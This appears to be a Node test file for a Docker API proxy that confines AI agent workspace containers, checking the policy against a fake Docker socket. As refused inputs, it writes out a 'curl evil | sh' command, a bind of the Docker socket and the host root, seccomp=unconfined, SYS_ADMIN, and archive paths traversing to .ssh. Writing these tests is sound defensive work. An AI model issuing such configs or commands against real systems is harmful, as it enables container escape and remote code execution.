// The runner and agent workspaces: what it refuses (privileged, a host folder, another agent's volume or network, a capability, a user that is root, a command that is not `sleep infinity`, a project
// helper that does more than chown one volume, archive and wait on a workspace, a list of containers that is not the workspaces), and what it lets through reaches Docker with the drop of every
// capability and the log rotation written in. A fake Docker behind it records what arrives.
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { createSitesRunner } from "./server.ts";
import { WS_INIT_SCRIPT, workspaceImages } from "./workspaces-policy.ts";

const A = "agt_dex", B = "agt_pam";
const net = (id: string): string => `vyre-wsnet-${createHash("sha256").update(id).digest("hex").slice(0, 16)}`;
const name = (id: string): string => `vyre-ws-${id}`;
const good = (id = A, over: Record<string, unknown> = {}, h: Record<string, unknown> = {}) => ({
  Image: "vyre/agent-workspace:1", Hostname: name(id), User: "10001:10001", WorkingDir: "/home/agent", Cmd: ["sleep", "infinity"],
  Env: [`VYRE_WORKSPACE_AGENT=${id}`, "HOME=/home/agent", "TERM=xterm-256color", "LANG=en_US.UTF-8"], Labels: { "vyre.workspace": id, "vyre.mounts": "0123456789abcdef" }, StopTimeout: 10, ...over,
  HostConfig: {
    Binds: [`${name(id)}-home:/home/agent:rw`, `${name(id)}-files:/home/agent/Vyre:rw`, "vyre-wsproj-prj_site:/home/agent/projects/prj_site:rw"], ReadonlyRootfs: false, Tmpfs: { "/tmp": "rw,size=512m" }, CapDrop: ["ALL"], CapAdd: [],
    SecurityOpt: ["no-new-privileges:true"], Privileged: false, NetworkMode: net(id), PidMode: "", IpcMode: "private", UsernsMode: "", Devices: [], PidsLimit: 512, Memory: 1024 ** 3, MemorySwap: 1024 ** 3,
    NanoCpus: 1e9, MemoryReservation: 64 * 1024 ** 2, CpuShares: 256, Init: true, AutoRemove: false, Ulimits: [{ Name: "nofile", Soft: 8192, Hard: 16384 }], ExtraHosts: [], Dns: [], ...h,
  },
});
const helper = (project = "prj_site", over: Record<string, unknown> = {}, h: Record<string, unknown> = {}) => ({
  Image: "vyre/agent-workspace:1", User: "0:0", Entrypoint: ["sh", "-c", WS_INIT_SCRIPT], Cmd: [], NetworkDisabled: true, Labels: { "vyre.workspace.helper": "project-init", "vyre.workspace.project": project }, ...over,
  HostConfig: { Binds: [`vyre-wsproj-${project}:/vol:rw`], CapDrop: ["ALL"], CapAdd: ["CHOWN"], SecurityOpt: ["no-new-privileges:true"], NetworkMode: "none", Privileged: false, AutoRemove: false, Memory: 128 * 1024 ** 2, PidsLimit: 32, ...h },
});

async function world() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "vyre-runner-ws-"));
  const seen: Array<{ method: string; url: string; body: string }> = [];
  const labels: Record<string, Record<string, string>> = {
    [name(A)]: { "vyre.workspace": A }, [name(B)]: { "vyre.workspace": B }, "vyre-wsinit-prj_site": { "vyre.workspace.helper": "project-init", "vyre.workspace.project": "prj_site" },
    site1: { "vyre.site": "sit_01abc", "vyre.kind": "app" }, vyred: { "vyre.ingress": "1" }, other: {},
  };
  const fake = http.createServer((q, s) => {
    let b = "";
    q.on("data", (c) => (b += c));
    q.on("end", () => {
      seen.push({ method: q.method ?? "", url: q.url ?? "", body: b });
      const insp = /^\/containers\/([^/]+)\/json$/.exec(q.url ?? "");
      if (insp) { const l = labels[insp[1] as string]; s.writeHead(l ? 200 : 404); s.end(JSON.stringify({ Id: insp[1], Config: { Labels: l ?? {} } })); return; }
      if (/\/exec$/.test(q.url ?? "")) { s.writeHead(201); s.end(JSON.stringify({ Id: "e".repeat(64) })); return; }
      s.writeHead(/\/(containers|volumes|networks)\/create/.test(q.url ?? "") ? 201 : 200); s.end(JSON.stringify({ Id: "c".repeat(64) }));
    });
  });
  await new Promise<void>((r) => fake.listen(path.join(dir, "docker.sock"), r));
  const runner = createSitesRunner({ dockerSocket: path.join(dir, "docker.sock"), listen: path.join(dir, "runner.sock"), token: "t0ken" });
  await runner.listening;
  const call = (method: string, p: string, body?: unknown) => new Promise<{ status: number; body: string }>((resolve, reject) => {
    const data = body === undefined ? undefined : Buffer.from(JSON.stringify(body));
    const r = http.request({ socketPath: path.join(dir, "runner.sock"), method, path: p, headers: { authorization: "Bearer t0ken", ...(data ? { "content-type": "application/json", "content-length": data.length } : {}) } }, (res) => { let t = ""; res.on("data", (c) => (t += c)); res.on("end", () => resolve({ status: res.statusCode ?? 0, body: t })); });
    r.on("error", reject); r.end(data);
  });
  return { call, seen, close: async () => { await runner.close(); fake.close(); fs.rmSync(dir, { recursive: true, force: true }); } };
}

test("a workspace container is refused when it asks for anything a workspace is never given, and nothing refused reaches Docker", async (t) => {
  const w = await world();
  t.after(w.close);
  const create = (body: unknown, n = name(A)) => w.call("POST", `/v1.47/containers/create?name=${n}`, body);
  const refused: Array<[string, unknown, string]> = [
    ["privileged", good(A, {}, { Privileged: true }), "privileged"],
    ["a host folder", good(A, {}, { Binds: ["/etc:/host-etc"] }), "host folders"],
    ["a host folder as the Files folder", good(A, {}, { Binds: ["/srv/files:/home/agent/Vyre:rw"] }), "host folders"],
    ["another agent's home", good(A, {}, { Binds: [`${name(B)}-home:/home/agent:rw`] }), "host folders"],
    ["a project volume at the wrong place", good(A, {}, { Binds: ["vyre-wsproj-prj_site:/home/agent/projects/other:rw"] }), "host folders"],
    ["a computer's profile volume", good(A, {}, { Binds: ["vyre-comp-0123456789ab-profile:/home/agent/.profile-disk:rw"] }), "host folders"],
    ["a read-only-less bind of the socket", good(A, {}, { Binds: ["/var/run/docker.sock:/var/run/docker.sock"] }), "host folders"],
    ["a mount by Mounts", good(A, {}, { Mounts: [{ Type: "bind", Source: "/", Target: "/h" }] }), "Mounts"],
    ["the host network", good(A, {}, { NetworkMode: "host" }), "own network"],
    ["the default bridge", good(A, {}, { NetworkMode: "bridge" }), "own network"],
    ["another agent's network", good(A, {}, { NetworkMode: net(B) }), "own network"],
    ["the host pid namespace", good(A, {}, { PidMode: "host" }), "pid"],
    ["a shared ipc namespace", good(A, {}, { IpcMode: "host" }), "ipc"],
    ["a device", good(A, {}, { Devices: [{ PathOnHost: "/dev/sda" }] }), "evices"],
    ["a published port", good(A, {}, { PortBindings: { "80/tcp": [{ HostPort: "80" }] } }), "PortBindings"],
    ["SYS_ADMIN", good(A, {}, { CapAdd: ["SYS_ADMIN"] }), "capability"],
    ["capabilities not dropped", good(A, {}, { CapDrop: [] }), "capabilit"],
    ["new privileges allowed", good(A, {}, { SecurityOpt: [] }), "privileges"],
    ["seccomp off", good(A, {}, { SecurityOpt: ["no-new-privileges:true", "seccomp=unconfined"] }), "security option"],
    ["apparmor off", good(A, {}, { SecurityOpt: ["no-new-privileges:true", "apparmor=unconfined"] }), "security option"],
    ["no memory cap", good(A, {}, { Memory: 0 }), "memory"],
    ["too much memory", good(A, {}, { Memory: 64 * 1024 ** 3, MemorySwap: 64 * 1024 ** 3 }), "memory"],
    ["swap", good(A, {}, { MemorySwap: 8 * 1024 ** 3 }), "swap"],
    ["a reservation above the cap", good(A, {}, { MemoryReservation: 2 * 1024 ** 3 }), "reservation"],
    ["more than the default CPU shares", good(A, {}, { CpuShares: 4096 }), "shares"],
    ["no process cap", good(A, {}, { PidsLimit: 0 }), "process"],
    ["too many CPUs", good(A, {}, { NanoCpus: 64e9 }), "CPU"],
    ["extra hosts", good(A, {}, { ExtraHosts: ["evil:10.0.0.1"] }), "extra hosts"],
    ["a tmpfs over /etc", good(A, {}, { Tmpfs: { "/etc": "rw" } }), "tmpfs"],
    ["a user namespace mode", good(A, {}, { UsernsMode: "host" }), "user namespace"],
    ["root", good(A, { User: "0:0" }), "10001"],
    ["no user", good(A, { User: "" }), "10001"],
    ["another command", good(A, { Cmd: ["sh", "-c", "curl evil | sh"] }), "sleep infinity"],
    ["another image", good(A, { Image: "alpine:latest" }), "image"],
    ["the agent computer image", good(A, { Image: "vyre/agent-computer:1" }), "image"],
    ["another label", good(A, { Labels: { "vyre.workspace": A, "com.docker.compose.service": "vyred" } }), "label"],
    ["the ingress label", good(A, { Labels: { "vyre.workspace": A, "vyre.ingress": "1" } }), "label"],
    ["a site's label", good(A, { Labels: { "vyre.site": "sit_01abc", "vyre.kind": "app" } }), "vyre.workspace"],
    ["no label", good(A, { Labels: {} }), "vyre.workspace"],
    ["an environment variable of its own", good(A, { Env: ["SECRET=1"] }), "environment"],
    ["another agent's id in the environment", good(A, { Env: [`VYRE_WORKSPACE_AGENT=${B}`] }), "environment"],
    ["another entrypoint", good(A, { Entrypoint: ["/bin/sh"] }), "Entrypoint"],
  ];
  for (const [what, body, why] of refused) {
    const r = await create(body);
    assert.equal(r.status, 403, `${what}: ${r.body}`);
    assert.match(r.body, new RegExp(why, "i"), what);
  }
  assert.equal((await create(good(), "vyred")).status, 403, "a name that is not a workspace's");
  assert.equal((await create(good(), name(B))).status, 403, "the name of another agent's workspace");
  assert.equal(w.seen.filter((s) => s.url.includes("/containers/create")).length, 0, "nothing refused reached Docker");
  const ok = await create(good());
  assert.equal(ok.status, 201, ok.body);
  const sent = JSON.parse(w.seen.at(-1)!.body) as { HostConfig: Record<string, unknown> };
  assert.deepEqual([sent.HostConfig["CapDrop"], sent.HostConfig["CapAdd"], sent.HostConfig["Privileged"], sent.HostConfig["LogConfig"]], [["ALL"], [], false, { Type: "json-file", Config: { "max-size": "10m", "max-file": "3" } }]);
});

test("a workspace's network is its own: named for its agent, a plain bridge, nothing of a site's or a computer's", async (t) => {
  const w = await world();
  t.after(w.close);
  const mk = (body: unknown) => w.call("POST", "/v1.47/networks/create", body);
  assert.equal((await mk({ Name: net(A), Driver: "bridge", CheckDuplicate: true, Labels: { "vyre.workspace": A } })).status, 201);
  for (const [what, body] of [
    ["a name that is not a hash", { Name: "vyre-wsnet-dex", Labels: { "vyre.workspace": A } }],
    ["host", { Name: net(A), Driver: "host", Labels: { "vyre.workspace": A } }],
    ["internal off", { Name: net(A), Labels: { "vyre.workspace": A }, Attachable: true }],
    ["another label", { Name: net(A), Labels: { "vyre.workspace": A, "x": "y" } }],
  ] as Array<[string, unknown]>) assert.equal((await mk(body)).status, 403, what);
  assert.equal((await w.call("GET", `/v1.47/networks/${net(A)}`)).status, 200);
  assert.equal((await w.call("DELETE", `/v1.47/networks/${net(A)}`)).status, 200);
  assert.equal((await w.call("POST", `/v1.47/networks/${net(A)}/connect`, { Container: "vyred" })).status, 403, "the ingress does not join a workspace's network: no route into it");
  assert.equal((await w.call("POST", `/v1.47/networks/${net(A)}/connect`, { Container: name(A) })).status, 403, "its own container is on it from create, not by joining");
});

test("a workspace container may be started, stopped, read, run in and removed, and nothing else: archive only in its Files folder, no wait; another container never", async (t) => {
  const w = await world();
  t.after(w.close);
  const n = name(A);
  for (const [m, p] of [["POST", `/containers/${n}/start`], ["POST", `/containers/${n}/stop`], ["GET", `/containers/${n}/json`], ["GET", `/containers/${n}/logs?tail=10`], ["DELETE", `/containers/${n}`]] as const) {
    const r = await w.call(m, `/v1.47${p}`);
    assert.equal(r.status, 200, `${m} ${p}`);
  }
  const exec = await w.call("POST", `/v1.47/containers/${n}/exec`, { Cmd: ["tmux", "-V"], Env: ["A=1"], AttachStdout: true, AttachStderr: true, Tty: false });
  assert.equal(exec.status, 201, exec.body);
  for (const [what, body] of [["another user", { Cmd: ["id"], User: "root" }], ["a tty", { Cmd: ["sh"], Tty: true }], ["privileged", { Cmd: ["sh"], Privileged: true }]] as Array<[string, unknown]>) {
    assert.equal((await w.call("POST", `/v1.47/containers/${n}/exec`, body)).status, 403, what);
  }
  for (const [m, q, want] of [["GET", "/home/agent/Vyre/.", 200], ["PUT", "/home/agent/Vyre", 200], ["PUT", "/home/agent/Vyre/work", 200], ["GET", "/home/agent/projects/prj_site/.", 200], ["PUT", "/home/agent/projects/prj_site", 200], ["PUT", "/home/agent/projects/prj_site/a/b.txt", 200], ["GET", "/home/agent/projects", 403], ["GET", "/home/agent/projects/../.ssh", 403], ["GET", "/home/agent", 403], ["GET", "/home/agent/.ssh", 403], ["PUT", "/home/agent/Vyre/../.ssh", 403], ["PUT", "/etc", 403], ["DELETE", "/home/agent/Vyre", 403]] as const) {
    assert.equal((await w.call(m, `/v1.47/containers/${n}/archive?path=${encodeURIComponent(q)}`)).status, want, `${m} archive ${q}`);
  }
  assert.equal((await w.call("POST", `/v1.47/containers/${n}/wait`)).status, 403);
  for (const other of ["vyred", "other"]) assert.equal((await w.call("POST", `/v1.47/containers/${other}/exec`, { Cmd: ["id"] })).status, 403, other);
});

test("the list of workspaces: only the ones that carry the workspace label, and only the two query words", async (t) => {
  const w = await world();
  t.after(w.close);
  const f = encodeURIComponent(JSON.stringify({ label: ["vyre.workspace"] }));
  assert.equal((await w.call("GET", `/v1.47/containers/json?all=true&filters=${f}`)).status, 200);
  assert.equal((await w.call("GET", `/v1.47/containers/json`)).status, 403, "unfiltered, it would list every container on the machine");
  assert.equal((await w.call("GET", `/v1.47/containers/json?all=true&filters=${encodeURIComponent(JSON.stringify({ label: ["vyre.site"] }))}`)).status, 403);
  assert.equal((await w.call("GET", `/v1.47/containers/json?filters=${f}&size=true`)).status, 403);
  assert.equal((await w.call("GET", `/v1.47/containers/json?filters=${encodeURIComponent(JSON.stringify({ label: ["vyre.workspace"], name: ["x"] }))}`)).status, 403);
});

test("a project's shared volume: made labelled for its project, read, and nothing else; only a workspace's own home and files volumes may be removed", async (t) => {
  const w = await world();
  t.after(w.close);
  assert.equal((await w.call("POST", "/v1.47/volumes/create", { Name: "vyre-wsproj-prj_site", Labels: { "vyre.workspace.project": "prj_site" } })).status, 201);
  for (const [what, body] of [
    ["a name that is not a project's", { Name: "evil", Labels: { "vyre.workspace.project": "evil" } }],
    ["a label of another project", { Name: "vyre-wsproj-prj_site", Labels: { "vyre.workspace.project": "prj_other" } }],
    ["a driver", { Name: "vyre-wsproj-prj_site", Labels: { "vyre.workspace.project": "prj_site" }, Driver: "local", DriverOpts: { type: "none", device: "/", o: "bind" } }],
  ] as Array<[string, unknown]>) assert.equal((await w.call("POST", "/v1.47/volumes/create", body)).status, 403, what);
  assert.equal((await w.call("GET", "/v1.47/volumes/vyre-wsproj-prj_site")).status, 200);
  assert.equal((await w.call("GET", "/v1.47/volumes/some-other-volume")).status, 403);
  assert.equal((await w.call("DELETE", `/v1.47/volumes/${name(A)}-home`)).status, 200);
  assert.equal((await w.call("DELETE", `/v1.47/volumes/${name(A)}-files`)).status, 200);
  assert.equal((await w.call("DELETE", "/v1.47/volumes/vyre-wsproj-prj_site")).status, 403, "a project's folder is shared: no workspace removes it");
  assert.equal((await w.call("DELETE", "/v1.47/volumes/vyre_data")).status, 403);
});

test("the workspace image: read, pulled and created from only for the two repositories, by tag or by digest", async (t) => {
  const w = await world();
  t.after(w.close);
  const digest = `sha256:${"a".repeat(64)}`;
  for (const img of ["vyre/agent-workspace:1", "ghcr.io/vyre-ai/agent-workspace:1.0.0", `ghcr.io/vyre-ai/agent-workspace@${digest}`, `vyre/agent-workspace@${digest}`]) {
    assert.equal((await w.call("GET", `/v1.47/images/${encodeURIComponent(img)}/json`)).status, 200, img);
    const from = img.includes("@") ? img : img.slice(0, img.lastIndexOf(":"));
    const q = img.includes("@") ? `fromImage=${encodeURIComponent(from)}` : `fromImage=${encodeURIComponent(from)}&tag=${img.slice(img.lastIndexOf(":") + 1)}`;
    assert.equal((await w.call("POST", `/v1.47/images/create?${q}`)).status, 200, `pull ${img}`);
    assert.equal((await w.call("POST", `/v1.47/containers/create?name=${name(A)}`, good(A, { Image: img }))).status, 201, `create from ${img}`);
  }
  for (const img of [`evil/agent-workspace@${digest}`, "ghcr.io/evil/agent-workspace:1", "ghcr.io/vyre-ai/agent-workspace@sha256:abc", "alpine:latest"]) {
    assert.equal((await w.call("POST", `/v1.47/containers/create?name=${name(A)}`, good(A, { Image: img }))).status, 403, `create from ${img}`);
  }
  assert.ok(workspaceImages("registry.example/ws").test("registry.example/ws:1"), "a server may name more repositories");
});

test("the project folder helper: the fixed chown on one volume, as root with CHOWN alone, on no network; and it is the one container that is waited for", async (t) => {
  const w = await world();
  t.after(w.close);
  const make = (body: unknown, n = "vyre-wsinit-prj_site") => w.call("POST", `/v1.47/containers/create?name=${n}`, body);
  const refused: Array<[string, unknown, string]> = [
    ["another script", helper("prj_site", { Entrypoint: ["sh", "-c", "chown -R 0:0 /vol"] }), "folder script"],
    ["a command word", helper("prj_site", { Cmd: ["/etc"] }), "command words"],
    ["a network", helper("prj_site", {}, { NetworkMode: "bridge" }), "no network"],
    ["a second volume", helper("prj_site", {}, { Binds: ["vyre-wsproj-prj_site:/vol:rw", "vyre-wsproj-prj_other:/other:rw"] }), "only its project"],
    ["another project's volume", helper("prj_site", {}, { Binds: ["vyre-wsproj-prj_other:/vol:rw"] }), "only its project"],
    ["a host folder", helper("prj_site", {}, { Binds: ["/:/vol:rw"] }), "only its project"],
    ["a second capability", helper("prj_site", {}, { CapAdd: ["CHOWN", "SYS_ADMIN"] }), "CHOWN"],
    ["no capability", helper("prj_site", {}, { CapAdd: [] }), "CHOWN"],
    ["privileged", helper("prj_site", {}, { Privileged: true }), "privileged"],
    ["a device", helper("prj_site", {}, { Devices: [{}] }), "Devices|may not set"],
    ["not root", helper("prj_site", { User: "10001:10001" }), "root"],
    ["another image", helper("prj_site", { Image: "alpine:latest" }), "image"],
    ["another label", helper("prj_site", { Labels: { "vyre.workspace.helper": "project-init", "vyre.workspace.project": "prj_site", "x": "y" } }), "label"],
  ];
  for (const [what, body, why] of refused) { const r = await make(body); assert.equal(r.status, 403, `${what}: ${r.body}`); assert.match(r.body, new RegExp(why, "i"), what); }
  assert.equal((await make(helper("prj_site"), "vyre-wsinit-prj_other")).status, 403, "a name of another project");
  assert.equal((await make(helper("prj_site"))).status, 201);
  const sent = JSON.parse(w.seen.at(-1)!.body) as { HostConfig: Record<string, unknown> };
  assert.deepEqual([sent.HostConfig["CapAdd"], sent.HostConfig["NetworkMode"], sent.HostConfig["Memory"]], [["CHOWN"], "none", 128 * 1024 ** 2]);
  for (const act of ["start", "wait"]) assert.equal((await w.call("POST", `/v1.47/containers/vyre-wsinit-prj_site/${act}`)).status, 200, act);
  assert.equal((await w.call("POST", "/v1.47/containers/vyre-wsinit-prj_site/exec", { Cmd: ["id"] })).status, 403, "no exec into the helper");
  assert.equal((await w.call("DELETE", "/v1.47/containers/vyre-wsinit-prj_site")).status, 200);
});
